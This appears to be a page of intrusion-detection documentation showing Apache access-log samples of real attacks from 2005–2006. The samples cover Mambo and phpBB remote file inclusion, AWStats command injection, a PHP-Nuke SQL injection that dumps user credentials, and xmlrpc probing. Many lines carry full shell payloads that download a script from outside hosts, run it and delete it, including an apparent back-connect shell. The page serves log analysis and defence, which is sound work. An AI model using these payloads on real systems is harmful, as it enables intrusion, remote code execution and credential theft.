Apache Attack samples
---------------------
  
Mambo attacks and their patterns in the apache access log file.
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  
.. code-block:: console
  
    193.91.75.11 - - [18/Aug/2006:13:23:13 -0300] "GET /index.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://www.freewebs.com/nokia-yes/tool.gif?&cmd=cd%20/tmp/;wget%20http://www.freewebs.com/nokia-yes/mambo.txt;perl%20mambo.txt;rm%20-rf%20mambo.*? HTTP/1.0" 200 167 "-" "Mozilla/5.0"
  
    212.227.132.51 - - [18/Aug/2006:05:24:07 -0300] "GET /index.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://www.openkid.co.kr/tool.gif?&cmd=cd%20/tmp/;wget%20http://www.openkid.co.kr/mambo.txt;perl%20mambo.txt;rm%20-rf%20mambo.*? HTTP/1.0" 200 167 "-" "Mozilla/5.0"
  
  
    201.226.254.210 - - [18/Aug/2006:13:47:46 -0300] "GET /index.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://www.freewebs.com/nokia-yes/tool.gif?&cmd=cd%20/tmp/;wget%20http://www.freewebs.com/nokia-yes/mambo.txt;perl%20mambo.txt;rm%20-rf%20mambo.*? HTTP/1.0" 200 167 "-" "Mozilla/5.0"
  
    212.227.132.51 - - [18/Aug/2006:13:56:29 -0300] "GET /index.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://www.freewebs.com/nokia-yes/tool.gif?&cmd=cd%20/tmp/;wget%20http://www.freewebs.com/nokia-yes/mambo.txt;perl%20mambo.txt;rm%20-rf%20mambo.*? HTTP/1.0" 200 167 "-" "Mozilla/5.0"
  
    62.103.159.21 - - [18/Aug/2006:13:58:02 -0300] "GET /index.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://www.freewebs.com/nokia-yes/tool.gif?&cmd=cd%20/tmp/;wget%20http://www.freewebs.com/nokia-yes/mambo.txt;perl%20mambo.txt;rm%20-rf%20mambo.*? HTTP/1.0" 200 167 "-" "Mozilla/5.0"
  
  
PHPBB attacks and their patterns in the apache access log file.
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  
.. code-block:: console
  
   207.36.232.148 - - [28/Aug/2006:07:08:46 -0300] "GET /index.php/Artigos/modules/Forums/admin/admin_users.php?phpbb_root_path=http://paupal.info/folder/cmd1.gif?&cmd=cd%20/tmp/;wget%20http://paupal.info/folder/mambo1.txt;perl%20mambo1.txt;rm%20-rf%20mambo1.*? HTTP/1.0" 200 14611 "-" "Mozilla/5.0"
  
  193.255.143.5 - - [28/Aug/2006:07:52:45 -0300] "GET /index.php/modules/Forums/admin/admin_users.php?phpbb_root_path=http://virtual.uarg.unpa.edu.ar/myftp/list.txt?&cmd=cd%20/tmp/;wget%20http://paupal.info/folder/mambo1.txt;perl%20mambo1.txt;rm%20-rf%20mambo1.*? HTTP/1.0" 200 14527 "-" "Mozilla/5.0"
  
  
SQL injection attempt on PHP Nuke
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  
.. code-block:: console
  
  200.96.104.241 - - [12/Sep/2006:09:44:28 -0300] "GET /modules.php?name=Downloads&d_op=modifydownloadrequest&%20lid=-1%20UNION%20SELECT%200,username,user_id,user_password,name,%20user_email,user_level,0,0%20FROM%20nuke_users HTTP/1.1" 200 9918 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)"
  
  
Night of scans
^^^^^^^^^^^^^^
  
.. code-block:: console
  
  [17/Dec/2005:02:40:45 -0500] - - 85.226.238.xxx "GET /awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20216%2e15%2e209%2e12%2flisten%3bchmod%20%2bx%20listen%3b%2e%2flisten%20216%2e102%2e212%2e115;echo%20YYY;echo| HTTP/1.1" "-" 302 547 0
  [17/Dec/2005:02:40:46 -0500] - - 85.226.238.xxx "GET /cgi-bin/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20216%2e15%2e209%2e12%2flisten%3bchmod%20%2bx%20listen%3b%2e%2flisten%20216%2e102%2e212%2e115;echo%20YYY;echo| HTTP/1.1" "-" 302 547 0
  [17/Dec/2005:02:40:47 -0500] - - 85.226.238.xxx "GET /cgi-bin/awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20216%2e15%2e209%2e12%2flisten%3bchmod%20%2bx%20listen%3b%2e%2flisten%20216%2e102%2e212%2e115;echo%20YYY;echo| HTTP/1.1" "-" 302 547 0
  [17/Dec/2005:02:40:48 -0500] - - 85.226.238.xxx "GET /index2.php?option=com_content&do_pdf=1&id=1index2.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://81.174.26.111/cmd.gif?&cmd=cd%20/tmp;wget%20216.15.209.12/listen;chmod%20744%20listen;./listen;echo%20YYY;echo| HTTP/1.1" "-" 302 637 0
  [17/Dec/2005:02:40:49 -0500] - - 85.226.238.xxx "GET /index.php?option=com_content&do_pdf=1&id=1index2.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://81.174.26.111/cmd.gif?&cmd=cd%20/tmp;wget%20216.15.209.12/listen;chmod%20744%20listen;./listen;echo%20YYY;echo| HTTP/1.1" "-" 302 637 0
  [17/Dec/2005:02:40:50 -0500] - - 85.226.238.xxx "GET /mambo/index2.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://81.174.26.111/cmd.gif?&cmd=cd%20/tmp;wget%20216.15.209.12/listen;chmod%20744%20listen;./listen;echo%20YYY;echo| HTTP/1.1" "-" 302 584 0
  [17/Dec/2005:02:40:52 -0500] - - 85.226.238.xxx "GET /cvs/index2.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://81.174.26.111/cmd.gif?&cmd=cd%20/tmp;wget%20216.15.209.12/listen;chmod%20744%20listen;./listen;echo%20YYY;echo| HTTP/1.1" "-" 302 584 0
  [17/Dec/2005:02:40:53 -0500] - - 85.226.238.xxx "GET /cvs/mambo/index2.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://81.174.26.111/cmd.gif?&cmd=cd%20/tmp;wget%20216.15.209.12/listen;chmod%20744%20listen;./listen;echo%20YYY;echo| HTTP/1.1" "-" 302 584 0
  [17/Dec/2005:03:07:04 -0500] - - 24.19.40.xxx "GET /awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20216%2e15%2e209%2e12%2flisten%3bchmod%20%2bx%20listen%3b%2e%2flisten%20216%2e102%2e212%2e115;echo%20YYY;echo| HTTP/1.1" "-" 302 547 0
  [17/Dec/2005:04:34:04 -0500] - - 64.105.82.xxx "GET /blogtest/xmlsrv/xmlrpc.php HTTP/1.1" "-" 302 336 0
  [17/Dec/2005:05:18:40 -0500] - - 195.82.6.xxx "GET /modules/Forums/admin/admin_styles.phpadmin_styles.php?phpbb_root_path=http://81.174.26.111/cmd.gif?&cmd=cd%20/tmp;wget%20216.15.209.4/criman;chmod%20744%20criman;./criman;echo%20YYY;echo| HTTP/1.1" "-" 302 498 0
  [17/Dec/2005:05:18:41 -0500] - - 195.82.6.xxx "GET /Forums/admin/admin_styles.phpadmin_styles.php?phpbb_root_path=http://81.174.26.111/cmd.gif?&cmd=cd%20/tmp;wget%20216.15.209.4/criman;chmod%20744%20criman;./criman;echo%20YYY;echo| HTTP/1.1" "-" 302 498 0
  [17/Dec/2005:05:18:43 -0500] - - 195.82.6.xxx "POST /xmlrpc.php HTTP/1.1" "-" 302 336 0
  [17/Dec/2005:05:18:45 -0500] - - 195.82.6.xxx "POST /blog/xmlrpc.php HTTP/1.1" "-" 302 336 0
  [17/Dec/2005:05:18:47 -0500] - - 195.82.6.xxx "POST /blog/xmlsrv/xmlrpc.php HTTP/1.1" "-" 302 336 0
  [17/Dec/2005:05:18:48 -0500] - - 195.82.6.xxx "POST /blogs/xmlsrv/xmlrpc.php HTTP/1.1" "-" 302 336 1
  [17/Dec/2005:05:18:50 -0500] - - 195.82.6.xxx "POST /drupal/xmlrpc.php HTTP/1.1" "-" 302 336 0
  [17/Dec/2005:05:18:52 -0500] - - 195.82.6.xxx "POST /phpgroupware/xmlrpc.php HTTP/1.1" "-" 302 336 0
  [17/Dec/2005:05:18:54 -0500] - - 195.82.6.xxx "POST /wordpress/xmlrpc.php HTTP/1.1" "-" 302 336 0
  [17/Dec/2005:05:18:55 -0500] - - 195.82.6.xxx "POST /xmlrpc.php HTTP/1.1" "-" 302 336 0
  [17/Dec/2005:05:18:57 -0500] - - 195.82.6.xxx "POST /xmlrpc/xmlrpc.php HTTP/1.1" "-" 302 336 0
  [17/Dec/2005:05:18:59 -0500] - - 195.82.6.xxx "POST /xmlsrv/xmlrpc.php HTTP/1.1" "-" 302 336 0
  [17/Dec/2005:09:14:57 -0500] - - 81.186.243.xxx "GET /modules/Forums/admin/admin_styles.phpadmin_styles.php?phpbb_root_path=http://81.174.26.111/cmd.gif?&cmd=cd%20/tmp;wget%20216.15.209.4/criman;chmod%20744%20criman;./criman;echo%20YYY;echo| HTTP/1.1" "-" 302 498 0
  [17/Dec/2005:09:14:58 -0500] - - 81.186.243.xxx "GET /Forums/admin/admin_styles.phpadmin_styles.php?phpbb_root_path=http://81.174.26.111/cmd.gif?&cmd=cd%20/tmp;wget%20216.15.209.4/criman;chmod%20744%20criman;./criman;echo%20YYY;echo| HTTP/1.1" "-" 302 498 0
  [17/Dec/2005:09:14:59 -0500] - - 81.186.243.xxx "POST /xmlrpc.php HTTP/1.1" "-" 302 336 1
  [17/Dec/2005:09:15:00 -0500] - - 81.186.243.xxx "POST /blog/xmlrpc.php HTTP/1.1" "-" 302 336 1
  [17/Dec/2005:09:15:02 -0500] - - 81.186.243.xxx "POST /blog/xmlsrv/xmlrpc.php HTTP/1.1" "-" 302 336 1
  [17/Dec/2005:09:15:03 -0500] - - 81.186.243.xxx "POST /blogs/xmlsrv/xmlrpc.php HTTP/1.1" "-" 302 336 1
  [17/Dec/2005:09:15:05 -0500] - - 81.186.243.xxx "POST /drupal/xmlrpc.php HTTP/1.1" "-" 302 336 0
  [17/Dec/2005:09:15:05 -0500] - - 81.186.243.xxx "POST /phpgroupware/xmlrpc.php HTTP/1.1" "-" 302 336 1
  [17/Dec/2005:09:15:06 -0500] - - 81.186.243.xxx "POST /wordpress/xmlrpc.php HTTP/1.1" "-" 302 336 1
  [17/Dec/2005:09:15:08 -0500] - - 81.186.243.xxx "POST /xmlrpc.php HTTP/1.1" "-" 302 336 1
  [17/Dec/2005:09:15:09 -0500] - - 81.186.243.xxx "POST /xmlrpc/xmlrpc.php HTTP/1.1" "-" 302 336 1
  [17/Dec/2005:09:15:10 -0500] - - 81.186.243.xxx "POST /xmlsrv/xmlrpc.php HTTP/1.1" "-" 302 336 1
  [17/Dec/2005:09:45:55 -0500] - - 69.65.151.xxx "PROPFIND / HTTP/1.0" "-" 403 332 0
  
.. code-block:: console
  
  201-67-28-XXX.bsace703.dsl.brasiltelecom.net.br - - [16/Sep/2006:15:18:53 -0300] "GET /cursosuperior/index.php?page=http://parit.org/CMD.gif?&cmd=cd%20/tmp;wget%20http://72.36.254.26/~fanta/dc.txt;perl%20dc.txt%2072.36.21.183%2021 HTTP/1.1" 200
  201-67-28-XXX.bsace703.dsl.brasiltelecom.net.br - - [16/Sep/2006:15:51:59 -0300] "GET /cursosuperior/index.php?page=http://parit.org/CMD.gif?&cmd=cd%20/tmp;wget%20http://72.36.254.26/~fanta/dc.txt;perl%20dc.txt%2072.36.21.183%2021 HTTP/1.1" 200
  
